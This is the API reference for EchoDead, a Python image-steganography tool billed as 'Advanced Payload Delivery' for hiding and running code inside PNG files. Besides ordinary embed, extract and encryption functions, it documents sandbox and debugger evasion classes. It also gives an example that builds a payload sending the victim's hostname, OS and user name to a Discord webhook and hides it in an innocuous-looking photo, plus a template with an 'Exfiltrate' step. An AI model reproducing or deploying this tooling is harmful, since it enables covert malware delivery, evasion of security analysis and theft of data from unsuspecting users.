# 📚 API Reference

## Complete Developer Documentation

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Core Module (main.py)](#-core-module-mainpy)
- [CLI Utils Module (cli_utils.py)](#-cli-utils-module-cli_utilspy)
- [Crypto Module (crypto_utils.py)](#-crypto-module-crypto_utilspy)
- [Integration Examples](#-integration-examples)
- [Extension Development](#-extension-development)
- [Testing](#-testing)

---

## 🌟 Overview

EchoDead can be used as:
1. **Standalone CLI tool** (interactive or command-line)
2. **Python library** (import into your own scripts)
3. **Extensible framework** (add custom payloads/features)

---

## 📦 Core Module (main.py)

### `embed_code_in_image()`

Embeds Python code or binary data into an image using LSB Steganography.

```python
def embed_code_in_image(
    image_path: str,
    code_path: str,
    output_image_path: str,
    password: Optional[str] = None,
    compress: bool = True
) -> bool:
    """
    Embed code/data into image using LSB Steganography.
    
    Args:
        image_path: Path to cover image (PNG recommended)
        code_path: Path to payload file (Python, binary, etc.)
        output_image_path: Path for output stego image
        password: Optional encryption password
        compress: Enable automatic compression (default: True)
    
    Returns:
        True if successful, False otherwise
    
    Raises:
        ValueError: If image too small for payload
        FileNotFoundError: If input files don't exist
        IOError: If image read/write fails
    """
```

**Example:**
```python
from src.main import embed_code_in_image

# Basic embedding
success = embed_code_in_image(
    image_path='cover.png',
    code_path='payload.py',
    output_image_path='stego.png'
)

# With encryption and compression
success = embed_code_in_image(
    image_path='cover.png',
    code_path='payload.py',
    output_image_path='stego.png',
    password='SecurePass123!',
    compress=True
)

if success:
    print("✅ Embedding successful!")
else:
    print("❌ Embedding failed!")
```

**Technical Details:**

1. **Capacity Check:**
   ```python
   max_bytes = (width * height * 3) // 8
   payload_size = len(code_bytes)
   
   if payload_size > max_bytes:
       raise ValueError(f"Image too small: {max_bytes}B capacity, {payload_size}B needed")
   ```

2. **Data Processing Pipeline:**
   ```
   Raw Payload → Compression (optional) → Encryption (optional) → LSB Embedding
   ```

3. **Flags Byte:**
   ```python
   flags = 0x00
   if compressed:
       flags |= 0x01  # Bit 0 = compression
   if encrypted:
       flags |= 0x02  # Bit 1 = encryption
   
   # Prepended to payload for auto-detection
   final_data = bytes([flags]) + processed_data
   ```

4. **LSB Modification:**
   ```python
   for bit in payload_bits:
       pixel_channel = pixels[pixel_idx][channel_idx]
       # Set LSB to payload bit
       pixel_channel = (pixel_channel & 0xFE) | bit
       pixels[pixel_idx][channel_idx] = pixel_channel
   ```

---

### `extract_code_from_image()`

Extracts embedded code/data from a stego image.

```python
def extract_code_from_image(
    image_path: str,
    output_code_path: str,
    password: Optional[str] = None
) -> bool:
    """
    Extract code/data from stego image.
    
    Args:
        image_path: Path to stego image
        output_code_path: Path for extracted payload
        password: Decryption password (if encrypted)
    
    Returns:
        True if successful, False otherwise
    
    Raises:
        ValueError: If decryption fails (wrong password)
        FileNotFoundError: If stego image doesn't exist
        IOError: If image read fails
    """
```

**Example:**
```python
from src.main import extract_code_from_image

# Basic extraction (auto-detects compression/encryption)
success = extract_code_from_image(
    image_path='stego.png',
    output_code_path='extracted.py'
)

# With decryption
success = extract_code_from_image(
    image_path='stego.png',
    output_code_path='extracted.py',
    password='SecurePass123!'
)
```

**Technical Details:**

1. **LSB Extraction:**
   ```python
   for pixel in pixels:
       for channel in (pixel[0], pixel[1], pixel[2]):
           bit = channel & 0x01  # Extract LSB
           bits.append(bit)
   ```

2. **Byte Reconstruction:**
   ```python
   bytes_data = []
   for i in range(0, len(bits), 8):
       byte_bits = bits[i:i+8]
       byte_value = int(''.join(map(str, byte_bits)), 2)
       bytes_data.append(byte_value)
   ```

3. **Auto-Detection:**
   ```python
   flags = extracted_bytes[0]
   is_compressed = bool(flags & 0x01)
   is_encrypted = bool(flags & 0x02)
   
   data = extracted_bytes[1:]  # Skip flags byte
   
   if is_encrypted:
       data = decrypt(data, password)
   
   if is_compressed:
       data = decompress(data)
   ```

---

### `run_extracted_code()`

Executes extracted Python code safely.

```python
def run_extracted_code(
    code_path: str,
    show_output: bool = True
) -> int:
    """
    Execute extracted Python payload.
    
    Args:
        code_path: Path to Python file
        show_output: Display execution output
    
    Returns:
        Exit code (0 = success)
    
    Raises:
        FileNotFoundError: If code file doesn't exist
    """
```

**Example:**
```python
from src.main import run_extracted_code

# Run with output
exit_code = run_extracted_code('extracted.py', show_output=True)

# Run silently
exit_code = run_extracted_code('extracted.py', show_output=False)

if exit_code == 0:
    print("✅ Execution successful!")
```

---

### `calculate_capacity()`

Calculates maximum payload capacity for an image.

```python
def calculate_capacity(image_path: str) -> dict:
    """
    Calculate embedding capacity.
    
    Args:
        image_path: Path to image file
    
    Returns:
        {
            'width': int,
            'height': int,
            'pixels': int,
            'max_bits': int,
            'max_bytes': int,
            'max_kb': float
        }
    """
```

**Example:**
```python
from src.main import calculate_capacity

capacity = calculate_capacity('cover.png')

print(f"Image: {capacity['width']}×{capacity['height']}")
print(f"Capacity: {capacity['max_kb']:.2f} KB")
print(f"Pixels: {capacity['pixels']:,}")
```

**Output:**
```
Image: 1920×1080
Capacity: 777.60 KB
Pixels: 2,073,600
```

---

## 🎨 CLI Utils Module (cli_utils.py)

### `print_banner()`

```python
def print_banner():
    """Display ASCII art banner with colors."""
```

**Example:**
```python
from src.cli_utils import print_banner

print_banner()
```

**Output:**
```
╔════════════════════════════════════════════╗
║     🖼️  EchoDead - Image Steganography 🔒   ║
║         Advanced Payload Delivery          ║
╚════════════════════════════════════════════╝
```

---

### `print_success()`, `print_error()`, `print_warning()`, `print_info()`

```python
def print_success(message: str):
    """Print green success message."""

def print_error(message: str):
    """Print red error message."""

def print_warning(message: str):
    """Print yellow warning message."""

def print_info(message: str):
    """Print blue info message."""
```

**Example:**
```python
from src.cli_utils import print_success, print_error, print_warning, print_info

print_success("✅ Operation completed successfully!")
print_error("❌ Failed to open file")
print_warning("⚠️  Large file size - may take time")
print_info("ℹ️  Compression enabled")
```

---

### `print_progress_bar()`

```python
def print_progress_bar(
    current: int,
    total: int,
    prefix: str = '',
    length: int = 50
):
    """
    Display progress bar.
    
    Args:
        current: Current progress value
        total: Total value (100%)
        prefix: Text before progress bar
        length: Bar length in characters
    """
```

**Example:**
```python
from src.cli_utils import print_progress_bar
import time

total_items = 100
for i in range(total_items + 1):
    print_progress_bar(i, total_items, prefix='Processing')
    time.sleep(0.05)
```

**Output:**
```
Processing |████████████████████████████████████████████████| 100%
```

---

### `print_table()`

```python
def print_table(
    headers: List[str],
    rows: List[List[str]],
    title: Optional[str] = None
):
    """
    Display formatted table.
    
    Args:
        headers: Column headers
        rows: Data rows
        title: Optional table title
    """
```

**Example:**
```python
from src.cli_utils import print_table

headers = ['Name', 'Size', 'Type']
rows = [
    ['hello.py', '247 bytes', 'Python'],
    ['data.bin', '1.2 KB', 'Binary'],
    ['image.png', '2.4 MB', 'Image'],
]

print_table(headers, rows, title='Files')
```

**Output:**
```
╔════════════════════════════════════════╗
║              Files                     ║
╠═══════════╦══════════╦═════════════════╣
║ Name      ║ Size     ║ Type            ║
╠═══════════╬══════════╬═════════════════╣
║ hello.py  ║ 247 bytes║ Python          ║
║ data.bin  ║ 1.2 KB   ║ Binary          ║
║ image.png ║ 2.4 MB   ║ Image           ║
╚═══════════╩══════════╩═════════════════╝
```

---

### `print_menu()`

```python
def print_menu(
    options: List[str],
    title: str = "Menu"
) -> None:
    """Display numbered menu."""
```

**Example:**
```python
from src.cli_utils import print_menu

options = [
    'Embed payload',
    'Extract payload',
    'Run workflow',
    'Exit'
]

print_menu(options, title='Main Menu')
```

---

### `prompt_input()`, `prompt_confirm()`

```python
def prompt_input(
    message: str,
    default: Optional[str] = None
) -> str:
    """Prompt for user input with optional default."""

def prompt_confirm(message: str) -> bool:
    """Prompt for yes/no confirmation."""
```

**Example:**
```python
from src.cli_utils import prompt_input, prompt_confirm

# Text input
filename = prompt_input("Enter filename", default="output.png")

# Confirmation
if prompt_confirm("Delete file?"):
    print("Deleting...")
else:
    print("Cancelled")
```

---

## 🔐 Crypto Module (crypto_utils.py)

### `PayloadEncryption`

```python
class PayloadEncryption:
    """Handles encryption and decryption using Fernet (AES-128-CBC + HMAC)."""
    
    def __init__(self, password: str):
        """
        Initialize with password.
        
        Args:
            password: Encryption password (string)
        """
    
    @staticmethod
    def derive_key(password: str, salt: bytes) -> bytes:
        """
        Derive encryption key from password using PBKDF2.
        
        Args:
            password: User password
            salt: 16-byte random salt
        
        Returns:
            32-byte key for Fernet
        """
    
    def encrypt(self, data: bytes) -> bytes:
        """
        Encrypt data.
        
        Args:
            data: Plain bytes
        
        Returns:
            Encrypted bytes (salt + ciphertext)
        """
    
    def decrypt(self, data: bytes) -> bytes:
        """
        Decrypt data.
        
        Args:
            data: Encrypted bytes (salt + ciphertext)
        
        Returns:
            Plain bytes
        
        Raises:
            InvalidToken: Wrong password or corrupted data
        """
```

**Example:**
```python
from src.crypto_utils import PayloadEncryption

# Encrypt
encryptor = PayloadEncryption(password='SecurePass123!')
plaintext = b"Secret payload data"
ciphertext = encryptor.encrypt(plaintext)

print(f"Original: {len(plaintext)} bytes")
print(f"Encrypted: {len(ciphertext)} bytes")

# Decrypt
decryptor = PayloadEncryption(password='SecurePass123!')
decrypted = decryptor.decrypt(ciphertext)

assert decrypted == plaintext
print("✅ Decryption successful!")
```

**Technical Details:**

1. **Key Derivation:**
   ```python
   from cryptography.hazmat.primitives import hashes
   from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
   
   kdf = PBKDF2HMAC(
       algorithm=hashes.SHA256(),
       length=32,
       salt=salt,
       iterations=100_000
   )
   key = kdf.derive(password.encode())
   ```

2. **Encryption:**
   ```python
   from cryptography.fernet import Fernet
   
   salt = os.urandom(16)
   key = derive_key(password, salt)
   fernet = Fernet(base64.urlsafe_b64encode(key))
   ciphertext = fernet.encrypt(plaintext)
   
   return salt + ciphertext  # Prepend salt
   ```

3. **Decryption:**
   ```python
   salt = data[:16]
   ciphertext = data[16:]
   
   key = derive_key(password, salt)
   fernet = Fernet(base64.urlsafe_b64encode(key))
   plaintext = fernet.decrypt(ciphertext)
   
   return plaintext
   ```

---

### `create_encrypted_payload()`

```python
def create_encrypted_payload(
    data: bytes,
    password: Optional[str] = None,
    compress: bool = True
) -> bytes:
    """
    Create encrypted/compressed payload with flags.
    
    Args:
        data: Raw payload bytes
        password: Encryption password (None = no encryption)
        compress: Enable compression
    
    Returns:
        Processed payload with flags byte prepended
    """
```

**Example:**
```python
from src.crypto_utils import create_encrypted_payload

data = b"print('Hello from payload!')"

# Encrypt + compress
processed = create_encrypted_payload(
    data=data,
    password='SecurePass123!',
    compress=True
)

print(f"Original: {len(data)} bytes")
print(f"Processed: {len(processed)} bytes")
print(f"Reduction: {(1 - len(processed)/len(data)) * 100:.1f}%")
```

---

### `extract_encrypted_payload()`

```python
def extract_encrypted_payload(
    data: bytes,
    password: Optional[str] = None
) -> bytes:
    """
    Extract and decrypt/decompress payload.
    Auto-detects compression and encryption from flags byte.
    
    Args:
        data: Processed payload (with flags byte)
        password: Decryption password
    
    Returns:
        Original plain payload
    
    Raises:
        ValueError: If decryption fails
    """
```

**Example:**
```python
from src.crypto_utils import create_encrypted_payload, extract_encrypted_payload

# Encrypt
original = b"Secret data"
encrypted = create_encrypted_payload(original, password='test', compress=True)

# Decrypt (auto-detects flags)
decrypted = extract_encrypted_payload(encrypted, password='test')

assert decrypted == original
print("✅ Round-trip successful!")
```

---

### `StealthFeatures`

```python
class StealthFeatures:
    """Anti-analysis and metadata removal features."""
    
    @staticmethod
    def remove_metadata(image_path: str) -> None:
        """Remove EXIF metadata from image."""
    
    @staticmethod
    def add_timing_jitter(min_ms: int = 100, max_ms: int = 500) -> None:
        """Add random delay to evade timing analysis."""
```

**Example:**
```python
from src.crypto_utils import StealthFeatures

# Remove metadata
StealthFeatures.remove_metadata('stego.png')

# Add random delay
StealthFeatures.add_timing_jitter(min_ms=100, max_ms=500)
```

---

### `AntiAnalysis`

```python
class AntiAnalysis:
    """Sandbox and debugger detection."""
    
    @staticmethod
    def detect_sandbox() -> bool:
        """Returns True if running in sandbox/VM."""
    
    @staticmethod
    def detect_debugger() -> bool:
        """Returns True if debugger detected."""
    
    @staticmethod
    def check_environment() -> dict:
        """
        Comprehensive environment check.
        
        Returns:
            {
                'is_sandbox': bool,
                'is_debugger': bool,
                'is_safe': bool
            }
        """
```

**Example:**
```python
from src.crypto_utils import AntiAnalysis

# Check environment
env = AntiAnalysis.check_environment()

if not env['is_safe']:
    print("⚠️  Unsafe environment detected!")
    if env['is_sandbox']:
        print("  - Running in sandbox/VM")
    if env['is_debugger']:
        print("  - Debugger attached")
    exit(1)
else:
    print("✅ Safe to proceed")
```

---

## 🔗 Integration Examples

### Example 1: Automated Payload Generation

```python
#!/usr/bin/env python3
"""Generate and embed payloads automatically."""

from src.main import embed_code_in_image
from src.cli_utils import print_success, print_error
import os

def generate_payload(webhook_url: str) -> str:
    """Generate custom payload with webhook."""
    payload_code = f'''
import requests
import platform

data = {{
    "hostname": platform.node(),
    "os": platform.system(),
    "user": os.getlogin()
}}

requests.post("{webhook_url}", json={{"content": str(data)}})
'''
    
    payload_path = 'generated_payload.py'
    with open(payload_path, 'w') as f:
        f.write(payload_code)
    
    return payload_path

def main():
    # Configuration
    webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK"
    cover_image = "images/vacation.png"
    output_image = "output/IMG_20240125.png"
    password = "SecurePassword123!"
    
    # Generate payload
    payload_path = generate_payload(webhook_url)
    print_success(f"✅ Generated payload: {payload_path}")
    
    # Embed
    success = embed_code_in_image(
        image_path=cover_image,
        code_path=payload_path,
        output_image_path=output_image,
        password=password,
        compress=True
    )
    
    if success:
        print_success(f"✅ Embedded in: {output_image}")
        # Cleanup
        os.remove(payload_path)
    else:
        print_error("❌ Embedding failed")

if __name__ == '__main__':
    main()
```

---

### Example 2: Batch Processing

```python
#!/usr/bin/env python3
"""Embed same payload in multiple images."""

from src.main import embed_code_in_image
from src.cli_utils import print_progress_bar, print_success
import os
from pathlib import Path

def batch_embed(payload_path: str, image_dir: str, output_dir: str, password: str):
    """Embed payload in all PNG images in directory."""
    
    # Find all PNG images
    images = list(Path(image_dir).glob('*.png'))
    total = len(images)
    
    print(f"Found {total} images to process")
    
    os.makedirs(output_dir, exist_ok=True)
    
    for i, image_path in enumerate(images):
        # Progress
        print_progress_bar(i, total, prefix='Embedding')
        
        # Output path
        output_path = os.path.join(output_dir, f"stego_{image_path.name}")
        
        # Embed
        embed_code_in_image(
            image_path=str(image_path),
            code_path=payload_path,
            output_image_path=output_path,
            password=password,
            compress=True
        )
    
    print_progress_bar(total, total, prefix='Embedding')
    print_success(f"\n✅ Processed {total} images")

if __name__ == '__main__':
    batch_embed(
        payload_path='payload.py',
        image_dir='input_images',
        output_dir='stego_images',
        password='SecurePass123!'
    )
```

---

### Example 3: Flask Web Service

```python
#!/usr/bin/env python3
"""Web API for Steganography operations."""

from flask import Flask, request, send_file, jsonify
from src.main import embed_code_in_image, extract_code_from_image
import os
import uuid

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/embed', methods=['POST'])
def embed_api():
    """
    Embed payload in image.
    
    POST Form Data:
        - image: Image file
        - payload: Payload file
        - password: Optional password
    
    Returns:
        Stego image file
    """
    try:
        image = request.files['image']
        payload = request.files['payload']
        password = request.form.get('password')
        
        # Save uploads
        image_id = str(uuid.uuid4())
        image_path = f"{UPLOAD_FOLDER}/{image_id}_cover.png"
        payload_path = f"{UPLOAD_FOLDER}/{image_id}_payload.py"
        output_path = f"{UPLOAD_FOLDER}/{image_id}_stego.png"
        
        image.save(image_path)
        payload.save(payload_path)
        
        # Embed
        success = embed_code_in_image(
            image_path=image_path,
            code_path=payload_path,
            output_image_path=output_path,
            password=password,
            compress=True
        )
        
        if success:
            return send_file(output_path, mimetype='image/png')
        else:
            return jsonify({'error': 'Embedding failed'}), 500
    
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/extract', methods=['POST'])
def extract_api():
    """
    Extract payload from stego image.
    
    POST Form Data:
        - image: Stego image
        - password: Optional password
    
    Returns:
        Extracted payload file
    """
    try:
        image = request.files['image']
        password = request.form.get('password')
        
        # Save upload
        image_id = str(uuid.uuid4())
        image_path = f"{UPLOAD_FOLDER}/{image_id}_stego.png"
        output_path = f"{UPLOAD_FOLDER}/{image_id}_extracted.py"
        
        image.save(image_path)
        
        # Extract
        success = extract_code_from_image(
            image_path=image_path,
            output_code_path=output_path,
            password=password
        )
        
        if success:
            return send_file(output_path, mimetype='text/x-python')
        else:
            return jsonify({'error': 'Extraction failed'}), 500
    
    except Exception as e:
        return jsonify({'error': str(e)}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
```

**Usage:**
```bash
# Start server
python api_server.py

# Embed via curl
curl -X POST http://localhost:5000/embed \
    -F "image=@cover.png" \
    -F "payload=@payload.py" \
    -F "password=SecurePass123!" \
    --output stego.png

# Extract via curl
curl -X POST http://localhost:5000/extract \
    -F "image=@stego.png" \
    -F "password=SecurePass123!" \
    --output extracted.py
```

---

## 🛠️ Extension Development

### Creating Custom Payloads

**Template:**
```python
#!/usr/bin/env python3
"""
Custom Payload Template
Description: [What this payload does]
Requirements: [Dependencies]
Exfiltration: [Yes/No - method]
OS: [Windows/macOS/Linux/All]
"""

import requests
import sys

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"

def send_to_discord(data: str):
    """Send data to Discord webhook."""
    try:
        response = requests.post(
            WEBHOOK_URL,
            json={'content': f'```\n{data}\n```'},
            timeout=10
        )
        return response.status_code == 204
    except:
        return False

def main():
    """Main payload logic."""
    try:
        # Your code here
        result = "Data collected"
        
        # Exfiltrate
        if send_to_discord(result):
            print("✅ Sent successfully")
        else:
            print("❌ Failed to send")
    
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        return 1
    
    return 0

if __name__ == '__main__':
    sys.exit(main())
```

**Add to library:**
```bash
python src/main.py payload add my_custom_payload.py
```

---

### Creating Custom CLI Commands

```python
# In src/main.py

def handle_custom_command():
    """Your custom command handler."""
    print_info("Running custom command...")
    
    # Your logic here
    
    print_success("✅ Custom command completed!")

# Add to main() menu
def main():
    # ... existing code ...
    
    options = [
        # ... existing options ...
        "Custom Command",  # Add your option
        "Exit"
    ]
    
    # ... existing menu code ...
    
    elif choice == "N":  # Replace N with actual number
        handle_custom_command()
```

---

## 🧪 Testing

### Unit Testing Template

```python
#!/usr/bin/env python3
"""Unit tests for EchoDead."""

import unittest
import os
from src.main import embed_code_in_image, extract_code_from_image
from src.crypto_utils import PayloadEncryption

class TestSteganography(unittest.TestCase):
    
    def setUp(self):
        """Setup test files."""
        self.test_image = 'test_images/test.png'
        self.test_payload = 'test_payloads/hello.py'
        self.output_image = 'test_output/stego.png'
        self.extracted_payload = 'test_output/extracted.py'
        
        os.makedirs('test_output', exist_ok=True)
    
    def test_basic_embed_extract(self):
        """Test basic embed and extract."""
        # Embed
        success = embed_code_in_image(
            self.test_image,
            self.test_payload,
            self.output_image
        )
        self.assertTrue(success)
        
        # Extract
        success = extract_code_from_image(
            self.output_image,
            self.extracted_payload
        )
        self.assertTrue(success)
        
        # Verify
        with open(self.test_payload, 'rb') as f:
            original = f.read()
        with open(self.extracted_payload, 'rb') as f:
            extracted = f.read()
        
        self.assertEqual(original, extracted)
    
    def test_encrypted_embed_extract(self):
        """Test encrypted embed and extract."""
        password = 'TestPass123!'
        
        # Embed with encryption
        success = embed_code_in_image(
            self.test_image,
            self.test_payload,
            self.output_image,
            password=password
        )
        self.assertTrue(success)
        
        # Extract with decryption
        success = extract_code_from_image(
            self.output_image,
            self.extracted_payload,
            password=password
        )
        self.assertTrue(success)
    
    def test_wrong_password_fails(self):
        """Test that wrong password fails decryption."""
        # Embed with password
        embed_code_in_image(
            self.test_image,
            self.test_payload,
            self.output_image,
            password='CorrectPass'
        )
        
        # Try to extract with wrong password
        with self.assertRaises(Exception):
            extract_code_from_image(
                self.output_image,
                self.extracted_payload,
                password='WrongPass'
            )
    
    def tearDown(self):
        """Cleanup test files."""
        for file in [self.output_image, self.extracted_payload]:
            if os.path.exists(file):
                os.remove(file)

class TestEncryption(unittest.TestCase):
    
    def test_encrypt_decrypt(self):
        """Test encryption round-trip."""
        encryptor = PayloadEncryption('TestPass123!')
        
        plaintext = b"Secret data"
        ciphertext = encryptor.encrypt(plaintext)
        decrypted = encryptor.decrypt(ciphertext)
        
        self.assertEqual(plaintext, decrypted)
    
    def test_different_passwords(self):
        """Test that different passwords produce different ciphertexts."""
        data = b"Secret data"
        
        enc1 = PayloadEncryption('Pass1')
        enc2 = PayloadEncryption('Pass2')
        
        cipher1 = enc1.encrypt(data)
        cipher2 = enc2.encrypt(data)
        
        self.assertNotEqual(cipher1, cipher2)

if __name__ == '__main__':
    unittest.main()
```

**Run tests:**
```bash
python test_EchoDead.py
```

---

## 📄 License & Support

**License:** MIT License - see [LICENSE](LICENSE) file

**Support:**
- GitHub Issues: [Report bugs](https://github.com/yourusername/EchoDead/issues)
- Documentation: [Full guides](README.md)

**Contributing:** PRs welcome! See [CONTRIBUTING.md](CONTRIBUTING.md)

---

**EchoDead API Reference** | Version 2.0 | For Developers
